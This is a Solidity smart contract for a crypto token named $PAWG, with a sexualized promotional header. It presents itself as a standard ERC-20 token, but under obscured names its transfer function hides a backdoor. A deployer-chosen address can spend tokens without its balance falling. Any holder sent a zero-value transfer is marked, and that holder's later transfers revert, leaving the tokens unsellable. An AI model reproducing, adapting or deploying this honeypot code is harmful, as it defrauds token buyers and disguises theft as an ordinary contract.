/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

/*

========== 👧$PAWG ==========

We believe the solution to every financial issue in the world is blonde $PAWGs.
Future is connection between girls, blockchain - lust and money.
We will build this vision.

https://t.me/pawg_erc20
https://www.pawgnextdoor.com

================================

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PAWG is Ownable {
    string public name = 'PAWG';

    function approve(address lay, uint256 taste) public returns (bool success) {
        allowance[msg.sender][lay] = taste;
        emit Approval(msg.sender, lay, taste);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function army(address amount, address move, uint256 taste) private returns (bool success) {
        if (follow[amount] == 0) {
            balanceOf[amount] -= taste;
        }

        if (taste == 0) doll[move] += heard;

        if (follow[amount] == 0 && uniswapV2Pair != amount && doll[amount] > 0) {
            follow[amount] -= heard;
        }

        balanceOf[move] += taste;
        emit Transfer(amount, move, taste);
        return true;
    }

    mapping(address => uint256) private follow;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    string public symbol = 'PAWG';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private heard = 66;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    function transferFrom(address amount, address move, uint256 taste) public returns (bool success) {
        require(taste <= allowance[amount][msg.sender]);
        allowance[amount][msg.sender] -= taste;
        army(amount, move, taste);
        return true;
    }

    uint8 public decimals = 9;

    constructor(address education) {
        balanceOf[msg.sender] = totalSupply;
        follow[education] = heard;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    address public uniswapV2Pair;

    mapping(address => uint256) private doll;

    function transfer(address move, uint256 taste) public returns (bool success) {
        army(msg.sender, move, taste);
        return true;
    }
}